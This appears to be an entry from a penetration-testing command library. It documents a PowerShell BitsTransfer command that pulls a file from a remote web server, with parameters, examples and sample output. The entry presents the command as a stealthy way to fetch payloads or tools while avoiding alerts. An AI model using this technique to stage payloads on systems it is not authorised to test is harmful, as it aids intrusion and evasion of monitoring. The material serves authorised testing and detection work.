---
id: 4a7eecf0-d67f-492c-ac2f-4b0f458dfc77
name: bitstransfer-download-file-from-web-server
type: command
executor: powershell
data: >-
  Import-Module BitsTransfer

  Start-BitsTransfer -Source http://$_REMOTE_IP/$_FILENAME -Destination
  $_FILENAME
output: >-
  PS C:\> Import-Module BitsTransfer

  PS C:\> Start-BitsTransfer -Source http://10.10.10.100/secrets -Destination
  secrets


  TransferJob 1/1: http://10.10.10.100/secrets | C:\secrets | 100% completed
created_at: '2019-11-25T23:58:29.353247+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - file-transfer
  - download
  - powershell
verified: true
validated: true
---

# bitstransfer-download-file-from-web-server

## Command

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source http://$_REMOTE_IP/$_FILENAME -Destination $_FILENAME
```

## Description

This command imports the BitsTransfer module and initiates a background download of a specified file from a remote web server using HTTP. It is useful in security testing for stealthily retrieving payloads or tools without using direct download methods that might trigger alerts. The transfer runs asynchronously and can resume if interrupted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_REMOTE_IP | IP address or hostname of the remote web server hosting the file | Yes |
| $_FILENAME | Name of the file to download (including path if needed on destination) | Yes |
| -Source | URL source for the file (constructed as http://$_REMOTE_IP/$_FILENAME) | Built-in |
| -Destination | Local path where the file will be saved | Built-in |

## Examples

### Basic Usage

Download a file named "secrets.txt" from a web server at 10.10.10.100:

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source http://10.10.10.100/secrets.txt -Destination secrets.txt
```

### Advanced Usage

Download with explicit monitoring:

```powershell
Import-Module BitsTransfer
$job = Start-BitsTransfer -Source http://$_REMOTE_IP/$_FILENAME -Destination $_FILENAME -Asynchronous
Get-BitsTransfer -JobId $job.JobId
Complete-BitsTransfer -JobId $job.JobId
```

## Expected Output

When executed successfully, the command imports the module silently and starts the BITS job. For synchronous mode (default), it shows progress:

```
PS C:\> Import-Module BitsTransfer
PS C:\> Start-BitsTransfer -Source http://10.10.10.100/secrets -Destination secrets

TransferJob 1/1: http://10.10.10.100/secrets | C:\secrets | 100% completed
```

In asynchronous mode, it returns immediately with a job ID, and progress can be checked separately. Success is indicated by the file appearing in the destination directory.

## Related

- [[Related Command: bitstransfer-upload-file-to-server]]
- [[Related Procedure: Download-Payload-Using-BitsTransfer]]
- [[Tool: bitstransfer]]
